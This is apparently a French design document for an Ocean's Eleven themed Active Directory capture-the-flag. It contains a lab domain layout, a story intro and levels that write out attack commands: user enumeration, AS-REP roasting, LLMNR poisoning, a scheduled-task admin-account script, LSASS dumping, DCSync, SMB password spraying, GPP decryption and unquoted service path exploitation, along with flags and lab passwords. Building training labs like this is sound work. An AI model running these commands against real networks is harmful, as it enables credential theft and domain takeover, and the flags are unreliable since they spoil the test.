
Ocean's Eleven

theme song: https://youtu.be/sdSai09_jzc
theme write: https://www.youtube.com/watch?v=FteCteGhnYY

mindmap ORANGE : https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg

Infra:
- 3 forêts (Bellagio, The Mirage, MGM Grand)
- Domaines enfants (Bellagio: casino.bellagio.com Mirage: casino.mirage.com MGM Grand: casino.mgmgrand.com )
- Pour les groupes dans les AD : Croupiers ( la ou un des equipiers est dedans (pas de droit) )  Sécurité casinon basique (Peu de droit) Sécurité vidéo (autre droit) sécurité des coffres ( beaucoup de droit mais pas admin admin) et le compte créateur de Terry Beneditct

=================================================================================

=================================================================================

Domaines et Unités d'Organisation (OU)

Domaines Enfants
    Bellagio: casino.bellagio.com
    Mirage: casino.mirage.com
    MGM Grand: casino.mgmgrand.com

Unités d'Organisation (OU)
=================================================================================

MGM Grand

  OU=Management <br/>
      PC: ManagementPC-MGM <br/>
      Utilisateurs: Benedict, Manager1-MGM, Manager2-MGM <br/>

  OU=VIP <br/>
      PC: VIPPC-MGM <br/>
      Utilisateurs: VIPManager-MGM, VIPAssistant-MGM <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-MGM <br/>
      Utilisateurs: SecurityChief-MGM, SecurityGuard1-MGM, SecurityGuard2-MGM <br/>

  OU=IT <br/>
      PC: ITServer-MGM, ITPC-MGM <br/>
      Utilisateurs: ITAdmin-MGM, ITSupport1-MGM, ITSupport2-MGM <br/>

  OU=Croupier <br/>
      PC: CroupierPC-MGM <br/>
      Utilisateurs: Croupier1-MGM, Croupier2-MGM <br/>

**********************************************************************************************************************************************


Mirage

  OU=Management <br/>
      PC: ManagementPC-Mirage <br/>
      Utilisateurs: Benedict, Manager1-Mirage, Manager2-Mirage <br/>

  OU=VIP <br/>
      PC: VIPPC-Mirage <br/>
      Utilisateurs: VIPManager-Mirage, VIPAssistant-Mirage <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-Mirage <br/>
      Utilisateurs: SecurityChief-Mirage, SecurityGuard1-Mirage, SecurityGuard2-Mirage <br/>

  OU=IT <br/>
      PC: ITServer-Mirage, ITPC-Mirage <br/>
      Utilisateurs: ITAdmin-Mirage, ITSupport1-Mirage, ITSupport2-Mirage <br/>

  OU=Croupier <br/>
      PC: CroupierPC-Mirage <br/>
      Utilisateurs: Croupier1-Mirage, Croupier2-Mirage <br/>

**********************************************************************************************************************************************

Bellagio

  OU=Management <br/>
      PC: ManagementPC-Bellagio <br/>
      Utilisateurs: Benedict, Manager1-Bellagio, Manager2-Bellagio <br/>

  OU=VIP <br/>
      PC: VIPPC-Bellagio <br/>
      Utilisateurs: VIPManager-Bellagio, VIPAssistant-Bellagio <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-Bellagio <br/>
      Utilisateurs: SecurityChief-Bellagio, SecurityGuard1-Bellagio, SecurityGuard2-Bellagio <br/>

  OU=IT <br/>
      PC: ITServer-Bellagio, ITPC-Bellagio <br/>
      Utilisateurs: ITAdmin-Bellagio, ITSupport1-Bellagio, ITSupport2-Bellagio <br/>

  OU=Croupier <br/>
      PC: CroupierPC-Bellagio <br/>
      Utilisateurs: Croupier1-Bellagio, Croupier2-Bellagio <br/>

**********************************************************************************************************************************************


Groupes AD

File Share Managers
    Description : Groupe contenant les employés responsables de la gestion des partages de fichiers.
    Membres : FileShareAdmin-Bellagio, FileShareAdmin-Mirage, FileShareAdmin-MGM

  CEO <br/>
      Description: Compte administrateur de Terry Benedict. <br/>
      Membres: Benedict <br/>


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Histoire inspiré de Ocean's Eleven à mettre dans l'intro :


Danny Ocean est un maître du casse et le cerveau derrière l'opération la plus audacieuse jamais orchestrée sur le Strip de Las Vegas. Après 2 ans passés en prison loin de sa femme Son objectif ? La reconquérir et dévaliser simultanément trois des plus prestigieux casinos détenus par le redoutable Terry Benedict, un magnat de la mafia et le nouvel homme de son ex femme dont le pouvoir s'étend jusque dans les systèmes numériques.

Pour préparer ce coup d’éclat, Ocean a réuni une équipe de onze spécialistes aux compétences complémentaires : voleur, expert en explosifs, pilotes hors pair, acrobate, as du déguisement.
Vous avez été reconnu pour vos prouesses et votre talent en réussissant un certain CTF nommé 2BGP, et vos compétences en pentest ont attiré l’attention d’Ocean.

Reconnu pour votre expertise en Active Directory et Windows Server, vous avez été minutieusement sélectionné. 

Votre objectif est d’aider le groupe à s’infiltrer dans les casinos. Pendant qu’ils seront sur le terrain, c’est à vous de surveiller tous les agissements. Vous serez infiltré directement dans une chambre d’hôtel, équipé de votre matériel informatique. Pour cela, ils ont besoin de votre aide : vous devrez découvrir et cartographier le réseau informatique des casinos. 

Bienvenu dans l'équipe et que le braquage commence !!!

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


0- nmap voir les protocoles et port ouvert

1- responder faille (LLMNR et Netbios)

2- cracker le mdp avec hashcat

3- verifier la validité du mdp avec netexec

4- se connecter à la machine locale via ssh (vu qu'on a les credentials et de plus c'est realiste)

5 bis - enumerer les droits de l'utilisateur grace à l'outil...

5- exploiter la faille des tâches planifiées afin de creer un compte admin

6- installer procdump puis creer un partage et extraire le contenu du lsass

7- cracker le contenu du lsass avec pypykatz

8- pass the hash NTLM

9- realiser la faille dcsync avec secretsdump

10- realiser la faille dcshadow

11 bis idées : exploiter le ticket d'or pour se creer un compte admin sur le second ad (à tester)

11- exploiter le lien trust pour enumerer le contenu du second ad ( à faire) ou kerbrute



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 1 (Reconnaissance NMAP) (AD Bellagio)  :

Script pour histoire du niveau :

Votre équipe est déjà infiltrée dans le casino, mais pour que le casse commence, vous devez d’abord pénétrer leur environnement informatique. 

Votre mission, si vous l’acceptez, consiste à identifier les types de serveurs présents sur leur réseau ainsi que les ports ouverts.

Cependant, après quelques verres bien placés, l’équipe a réussi à soudoyer un membre du service IT, obtenant ainsi une plage d’adresses IP…
En lançant une reconnaissance méticuleuse avec nmap, vous allez pouvoir cartographier le réseau du casino et identifier les services exposés.

Attaque : 

lancer un nmap pour que la personne connaissent son réseaux qui répondent 

nmap -Pn -p- -sV -sC 10.X.0.111/24

ping IP SRV (vu en nmap) => Permet de voir TTL 128 donc WinSRV


Key ctf = 128 + Bellagio.local


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Level 2 Trouver les user (AD Bellagio) :

Script pour histoire du niveau :

Après avoir cartographié l’infrastructure du casino grâce à NMAP. Votre équipe se retrouve face à un nouveau défi : pénétrer le cœur de l’Active Directory pour dénicher les identifiants des employés et des comptes de services.

Grâce aux informations récoltées au niveau 1, vous savez désormais quels serveurs hébergent le rôle de contrôleur de domaine et comment la topologie du réseau est organisée. Mais pour progresser et obtenir un accès privilégié, il vous faut d’abord dresser une liste des comptes Active Directory susceptibles d’être utilisés dans l’environnement Bellagio.local.

Un de vos contacts au sein du service IT, toujours sous l’effet des « encouragements » financiers de la bande, a réussi à récupérer un fichier brut : une liste d’environ 1 000 noms d’utilisateurs utilisés pour le support interne et les services automatisés. Vous téléchargez discrètement ce fichier puis l’analysez pour en extraire les comptes potentiellement valides.

Attaque : 

Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela, on peut fournir une liste d'user à l'utilisateur qui peut telechagrer depuis le site web avec 1000 username afin de bruteforce et on met par exemple 5 username valides.

kerbrute userenum --dc "10.100.0.111" -d "bellagio.local" users.txt

FLAG : svc-bella

Mettre dans list_recup.txt les noms recuperes

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 3 prendre controle d'un compte sans permission (ASREP-Roasting) (AD Bellagio)  :

Script pour histoire du niveau :

Terry Benedicta sous-estime une faille cruciale dans son système de sécurité informatique. Les comptes de service de son réseau Active Directory n'ont pas de pré-authentification requise, une vulnérabilité connue sous le nom d'ASREP-Roasting.

Votre objectif est de récupérer le hashs des mots de passe de l'utilisateur précédemment trouvé pour permettre à l'équipe d'Ocean de récuperer ces comptes et de prendre le contrôle des comptes nécessaires pour désactiver les systèmes de sécurité des casinos.


Attaque : 

=> L'attaque consiste à recuperer le hash d'un password. Cette technique exploite le fait que si un utilisateur n'a pas de pré-authentification requise (ce qui est le cas par défaut pour les comptes de service), le serveur Kerberos renverra le TGT chiffré avec le mot de passe de l'utilisateur sans vérifier le mot de passe au préalable.


GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users_list.txt" -dc-ip "10.100.0.111" "bellagio.local/"

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

Flag (à soumettre) : P@ssw0rd



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Level 4 (AD Bellagio) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR

Script pour histoire du niveau :

Grâce à votre compte SVC-bella sur le domaine bellagio.local, Maintenant tu peux donc effectuer une recherche ldap pour connaitre le ou les différents lien de confiance qui sont liés a cet AD. (ldapsearch -H ldap://10.100.0.111 -D "bellagio\svc-bella" -W -x -b "DC=bellagio,DC=local" >> ldapsearch.txt)

Grace a toutes ces informations tu peux par exemple t'interesser au partage samba en utilisant le client samba de exegol...

Attaque : 

smbmap -H "10.100.0.111" -d bellagio.local -u 'svc-bella' -p 'P@ssw0rd'

Lire le fichier de log et le pentester ce rend compte que toutes les 5min un utilisateur se connecte et execute un script toutes les 5 minutes (taches planifiées) 

smbclient //10.100.0.111/script -U 'bellagio\svc-bella%P@ssw0rd'

get 111_script_smb.ps1

Modifier le nom de domaine dans le fichier du script 111_script_smb.ps1

Lancer responder qui empoisonnera les réponses LLMNR Netbios et qui récupèrent le hash du compte. 

responder -i ens18 

Flag :


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 5 (AD Mgm Grand) : Escalade de privilèges via une tache planifié

Script pour histoire du niveau :

Après avoir consolidé votre accès sur dans le casino Bellagio et pris le contrôle du serveur de sauvegarde, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Une source à vous révèle qu’un script PowerShell s’exécute toutes les heures avec des droits élevés sur une machine membre du domaine MGM.

Votre objectif est simple : modifier le contenu du fichier de script planifié de façon à créer un compte avec assez au niveau de privilège au prochain passage de la tâche.

Attaque :

L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés

Exemple de script : 
```powershell
$username = "NomUtilisateur"

$password = "MotDePasse123!"

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

New-LocalUser -Name $username -Password $securePassword -FullName "Nom Complet" -Description "Utilisateur admin créé via script"

Add-LocalGroupMember -Group "Administrators" -Member $username

Write-Host "Utilisateur $username créé et ajouté au groupe Administrators."

```



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 6 (AD MGM grand) : Dump mémoire LSAAS


Script pour histoire du niveau :

Après avoir créé le compte admin, l’équipe d’Ocean se trouve en position idéale pour s’attaquer à un objectif encore plus précieux : les secrets en mémoire vive du système stockés dans le processus LSASS.


Votre mission pour ce niveau consiste donc à utiliser votre compte admin pour dumper la mémoire, puis extraire de ce dump tous les identifiants utiles (hashes NTLM, tickets Kerberos).

Attaque : 

scp ProcDump.exe mimikatz.exe ocean-admin@MGM-SRV:C:\temp\

Enter-PSSession -ComputerName MGM-SRV -Credential MGM\ocean-admin

cd C:\temp

.\ProcDump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp

Exit-PSSession

scp ocean-admin@MGM-SRV:C:\temp\lsass.dmp /path/to/local/

```powershell
exegol-adpentest /workspace # pypykatz lsa minidump "ssss.dmp" --json

```




--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Level 7:  DCSYNC 

Script pour histoire du niveau :

Vous avez désormais les privilèges de Domain Admin sur le domaine MGM Grand. Avec ce niveau d’accès, vous êtes à deux doigts de contrôler totalement l’infrastructure Active Directory. Cependant, pour finaliser votre emprise, il vous faut centraliser tous les secrets du domaine : mots de passe de chaque utilisateur, comptes de services, et le hash du compte krbtg...

Votre mission pour ce niveau consiste à simuler un contrôleur de domaine afin d’interroger directement l’AD. En exécutant DCSYNC depuis une machine compromise, vous ne déclencherez pas les journaux classiques d’un dump direct de la base AD, car c’est l’API Domain Replication (RPC) qui vous fournira copie des attributs sensibles (ntHash, LMHash, etc.) en tant que « réplicateur ».

Attaque : 

Grâce à l’étape précédente, vous possédez le hash NTLM (ou le ticket Kerberos) du compte Administrator@MGM. Assurez-vous d’avoir un shell administratif sur une machine du domaine (par exemple via wmiexec.py ou pth-winexe), ou d’être connecté directement sur le contrôleur de domaine.

Choisir l’outil pour DCSYNC
Deux méthodes courantes :

Mimikatz (sekurlsa::dcsync)

Impacket (secretsdump.py – –dc-sync)

DCSYNC avec Mimikatz

Ouvrez une session sur une machine Windows où Mimikatz est disponible, avec un compte Domain Admin (ici, MGM\Administrator ou équivalent).

Lancez Mimikatz en mode élevé (PowerShell ou CMD « Exécuter en tant qu’administrateur »), puis exécutez :

mimikatz.exe
privilege::debug
lsadump::dcsync /domain:mgm.local /all /csv /output:C:\temp\hashes_dcsync.csv
exit
lsadump::dcsync /domain:mgm.local /all extrait tout le set d’attributs réplicables pour tous les comptes (y compris le hash NTLM et le LMHash).

Le paramètre /csv /output:… enregistre les données dans un fichier CSV (C:\temp\hashes_dcsync.csv).

DCSYNC avec Impacket (secretsdump.py)

Sur votre machine pentest (Linux/macOS), exécutez :

secretsdump.py MGM/Administrator@"MGM-DC.mgm.local" -just-dc-user krbtgt -outputfile mgm_hashes
Cette commande cible spécifiquement le compte krbtgt, mais vous pouvez omettre -just-dc-user krbtgt pour récupérer tous les comptes :


secretsdump.py MGM/Administrator@"MGM-DC.mgm.local" -outputfile mgm_hashes
Le fichier mgm_hashes.ntds contiendra les hash NTLM de chaque compte, incluant celui de krbtgt.

Vérifier et extraire le hash du compte krbtgt

Ouvrez le fichier CSV (avec Excel, un éditeur de texte ou un script) et repérez la ligne dont UserName = krbtgt.

Notez la colonne NTLMHash (et AAD_SHA si vous prévoyez un Silver Ticket).

Exemple de sortie tirée de Mimikatz :


"MGM\krbtgt","AAD_SHA: …","NTLM: be0c07d7a82f4e1a9b7c3a5a6f7b8c9d",…

Ici, le NTLM: be0c07d7a82f4e1a9b7c3a5a6f7b8c9d est la valeur qui intéresse.

Centraliser tous les hashes

Conservez l’ensemble des hashes NTLM dans un fichier sécurisé (mgm_all_hashes.txt) pour un usage ultérieur.

Vous pourrez ensuite craquer les mots de passe si nécessaire, ou directement utiliser les hash pour passer le hash sur d’autres services du domaine.

Valider la réussite du niveau 7

Flag implicite : l’obtention du hash NTLM du compte krbtgt du domaine mgm.local.

Documentez la valeur exacte (par exemple : krbtgt NTLM = be0c07d7a82f4e1a9b7c3a5a6f7b8c9d) et soumettez-la pour valider ce niveau.

Dans certains environnements CTF, on vous demandera explicitement :

Flag à soumettre : be0c07d7a82f4e1a9b7c3a5a6f7b8c9d

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 8: Fabrication ticket Kerberos 


Après avoir extrait le hash NTLM du compte krbtgt du domaine mgm.local lors du niveau 7, l’équipe d’Ocean détient désormais la clé ultime pour manipuler Kerberos à sa guise. En effet, le compte krbtgt est utilisé par le Key Distribution Center (KDC) pour chiffrer et signer les tickets Kerberos ; posséder son hash équivaut à pouvoir fabriquer de toutes pièces un TGT (Ticket Granting Ticket) valide pour n’importe quel utilisateur du domaine. Vous êtes donc prêts à forger un Golden Ticket, qui vous ouvrira instantanément les droits de n’importe quel compte (en particulier un compte “Domain Admin”) sur tout l’AD MGM Grand, sans jamais alerter les journaux de connexion standard.

Votre mission pour ce niveau consiste à utiliser l’outil Mimikatz (ou Rubeus, selon votre préférence) pour générer un TGT factice et l’injecter dans votre session. Grâce à ce Golden Ticket, vous pourrez ensuite accéder à n’importe quel serveur du domaine MGM, extraire des secrets, créer des comptes persistants ou simplement naviguer librement dans l’infrastructure AD. Vous êtes extrêmement proches de la compromission totale de l’AD MGM Grand.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 9 (AD Mirage) : reconaissance du troiseme AD

!!! Fournir liste users.txt et password.txt !!!

nxc smb 10.1.3.1 -u users.txt -p passwords.txt -t 16
=> Resultat attendu SMB         10.1.3.1        445    WINDOWS-7HBD3FQ  [+] mirage.local\FrankCatton:P@ssw0rd 

Il peut maintenant se connecter au paratge SMB et regarder les informations .....


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 10 (AD Mirage) : Exploitation des mots de passe GPP (Group Policy Preferences)

Connexion au paratge SMB du 3 eme AD avec le compte recupere
Liste les repertoires sur le partage

exegol-ad /workspace # smbmap -H "10.1.3.1" -d mirage.local -u 'FrankCatton' -p 'P@ssw0rd' 

Resultat attendu : 

                                                                                                                                                                │·················································
[+] IP: 10.1.3.1:445    Name: 10.1.3.1                  Status: Authenticated                                                                                   │·················································
        Disk                                                    Permissions     Comment                                                                         │·················································
        ----                                                    -----------     -------                                                                         │·················································
        ADMIN$                                                  NO ACCESS       Remote Admin                                                                    │·················································
        C$                                                      NO ACCESS       Default share                                                                   │·················································
        IPC$                                                    READ ONLY       Remote IPC                                                                      │·················································
        NETLOGON                                                READ ONLY       Logon server share                                                              │·················································
        SYSVOL                                                  READ ONLY       Logon server share  


Il peut aller dans sysvol il lit les choses interessantes ....

cd mirage.local\Policies\{12345678-1234-1234-1234-123456789ABC}\Machine\Preferences\Groups\ 

smb: \mirage.local\Policies\{12345678-1234-1234-1234-123456789ABC}\Machine\Preferences\Groups\> ls                                                              │·················································
  .                                   D        0  Thu Jun  5 15:36:29 2025                                                                                      │·················································
  ..                                  D        0  Thu Jun  5 15:36:29 2025                                                                                      │·················································
  Groups.xml                          A      531  Thu Jun  5 15:36:29 2025                                                                                      │·················································

 get Groups.xml 

 [Jun 05, 2025 - 14:05:00 (CEST)] exegol-ad /workspace # ls | grep Gro                                                                                           │·················································
Groups.xml                                                                                                                                                      │·················································
[Jun 05, 2025 - 14:05:06 (CEST)] exegol-ad /workspace #   

gpp-decrypt.py -f Groups.xml  

Il recupere le password avec le compte

[ * ] Username: svc-backup                                                                                                                                      │·················································
[ * ] Password: GPPstillStandingStrong2k18   
                                                                             
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 11 (AD Mirage) : Escalade de privilèges vi un chemin sans quotes

Script pour histoire du niveau :

Après avoir consolidé votre accès sur dans le casino Bellagio, l’équipe d’Ocean se tourne désormais vers un nouveau terrain de jeu : Le MGM Grand. Grace a votre compte de service récupéré sur cet AD, et des reconaissances suplémentaires, vous pouvez désormais vous connecter à un PC via un service de controle à distance.

Maintenant, analysez bien ce qu'il y a sur l'ordinateur, et exploiter y une faille ....


Attaque Unquoted Service Path : 

L'utilisateur se doit de créer un compte admin local grace a son droit de changer le fichier de script dans les taches planifiés



Commandes :

Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*"'} | Select-Object Name, DisplayName, PathName
=> Liste les services sans quote.

icacls "C:\Chemin\Vers\Le\Dossier"
=> Verifie les permission

# Créer un script malveillant
$maliciousScript = @'
$path = "$env:USERPROFILE\Desktop\exploit.txt"
New-Item -ItemType File -Path $path -Force
Set-Content -Path $path -Value "Ce fichier a été créé via une exploitation de service non sécurisé."
'@

Set-Content -Path "C:\Program.exe" -Value $maliciousScript

Copier le script malveillant dans le répertoire cible
Copy-Item "C:\Program.exe" -Destination "C:\Program Files\Some Folder\Program.exe"

Redémarrer le service vulnérable
Restart-Service -Name "VulnerableService"

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 12:
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



